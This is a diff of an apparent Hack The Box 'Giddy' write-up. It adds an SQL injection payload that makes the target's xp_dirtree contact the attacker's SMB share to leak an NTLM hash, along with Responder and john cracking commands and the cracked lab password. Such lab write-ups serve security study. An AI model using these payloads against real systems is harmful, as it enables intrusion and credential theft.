@@ -58,21 +58,32 @@ Given command will dump tables to `/root/.sqlmap/output/10.10.10.104/dump/Inject
 ![SQL injection](/assets/sqlmap-files-10.10.10.104.png)
 
 But the only useful info we could find is the user --> `Stacy`
-Ok. So what's next?
-After some googling around.
-Everybody was pointing to this post [https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html][xpdirtree] about xpdirtree
 
-We can try to capture NTLM hash using xp_dirtree by making it connect to our SMB server or responder.
+Ok. So what's next?
+After some googling around I noticed that everybody was pointing to this post [https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html][xpdirtree] about xp_dirtree.
 
 `xpdirtree : 1; EXEC MASTER.sys.xp_dirtree '\\10.10.14.19\share'`
 
 ![SQL request](/assets/sqli-request-10.10.10.104.png)
 
-Start smbserver.py to listen on our Kali machine
+We can try to capture NTLM hash using extended stored procedure `xp_dirtree` by making it connect to our [smbserver](https://github.com/SecureAuthCorp/impacket) or [Responder](https://github.com/lgandx/Responder).
+Good article on responder [Pwning with Responder – A Pentester’s Guide](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
+
+So, let's start smbserver.py that will listen on our Kali machine
 
 ![listen with smbserver.py](/assets/smbserver-10.10.10.104.png)
 
-and we got hash:
+Alternatively we can do it with responder
+
+request:
+
+`https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=10; EXEC MASTER.sys.xp_dirtree '\\10.10.14.19'`
+
+listen:
+
+`./Responder.py -I tun0 -w -r -f`
+
+Either way we will get hash:
 
 {% highlight shell %}
 Stacy::GIDDY:
@@ -80,7 +91,7 @@ Stacy::GIDDY:
 {% endhighlight %}
 
 So I saved it to giddy_hash.txt file and try to crack it.
-We can do it in `hashcat` or `john`
+We can do it using `hashcat` or `john`
 
 hashcat
 
@@ -90,10 +101,13 @@ hashcat
 
 john
 
+`john --wordlist=/usr/share/wordlists/rockyou.txt giddy_hash.txt`
+
 ![john](/assets/john-10.10.10.104.png)
 
 password: xNnWo6272k7x
-So now, let's go to /remote and login with our creds
+
+So now, let's go to /remote and try to login with our creds
 
 ![login](/assets/login-10.10.10.104.png)
 
